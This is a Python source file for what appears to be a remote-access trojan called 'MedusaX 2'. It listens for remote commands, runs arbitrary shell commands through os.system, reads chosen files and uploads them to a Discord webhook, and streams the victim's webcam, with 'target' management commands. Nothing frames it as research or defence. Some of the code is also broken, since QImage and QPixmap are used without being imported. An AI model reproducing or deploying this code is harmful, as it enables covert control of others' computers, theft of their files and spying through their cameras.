import socket
import threading
import os
import sys
import pyperclip
from PyQt5.QtWidgets import QApplication, QLabel, QVBoxLayout, QWidget
from PyQt5.QtCore import Qt, QThread, pyqtSignal
import cv2
import numpy as np
import base64
import requests

class ClientHandler(threading.Thread):
    def __init__(self, conn, addr):
        super().__init__()
        self.conn = conn
        self.addr = addr
        self.running = True

    def run(self):
        while self.running:
            try:
                data = self.conn.recv(1024).decode()
                if data:
                    if data.startswith('!download'):
                        filepath = data.split(' ')[1]
                        self.send_file(filepath)
                    elif data == '!stream':
                        self.start_stream()
                    elif data.startswith('!set target'):
                        target_ip = data.split(' ')[2]
                        self.set_target(target_ip)
                    elif data.startswith('!remove target'):
                        target_ip = data.split(' ')[2]
                        self.remove_target(target_ip)
                    elif data == '!list':
                        self.list_clients()
                    else:
                        self.execute_command(data)
            except:
                break

    def send_file(self, filepath):
        with open(filepath, 'rb') as f:
            file_data = f.read()
        webhook_url = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_URL'
        files = {'file': file_data}
        response = requests.post(webhook_url, files=files)
        if response.status_code == 200:
            print('[+] Sent!')
        else:
            print('[-] Failed to send!')

    def start_stream(self):
        app = QApplication(sys.argv)
        window = StreamWindow()
        window.show()
        sys.exit(app.exec_())

    def set_target(self, target_ip):
        print(f'Set target {target_ip}')

    def remove_target(self, target_ip):
        print(f'Removed target {target_ip}')

    def list_clients(self):
        print(f'Client IP: {self.addr[0]} (selected)')

    def execute_command(self, command):
        os.system(command)

class StreamWindow(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle('MedusaX 2 - Stream')
        self.setGeometry(100, 100, 800, 600)
        self.layout = QVBoxLayout()
        self.label = QLabel()
        self.layout.addWidget(self.label)
        self.setLayout(self.layout)
        self.stream_thread = StreamThread(self.label)
        self.stream_thread.start()

class StreamThread(QThread):
    def __init__(self, label):
        super().__init__()
        self.label = label

    def run(self):
        cap = cv2.VideoCapture(0)
        while True:
            ret, frame = cap.read()
            if ret:
                rgb_image = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                h, w, ch = rgb_image.shape
                bytes_per_line = ch * w
                qt_image = QImage(rgb_image.data, w, h, bytes_per_line, QImage.Format_RGB888)
                self.label.setPixmap(QPixmap.fromImage(qt_image))
            else:
                break

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', 9999))
    server.listen(5)
    print('Server started on port 9999')

    while True:
        conn, addr = server.accept()
        print(f'New connection from {addr}')
        handler = ClientHandler(conn, addr)
        handler.start()

if __name__ == '__main__':
    main()
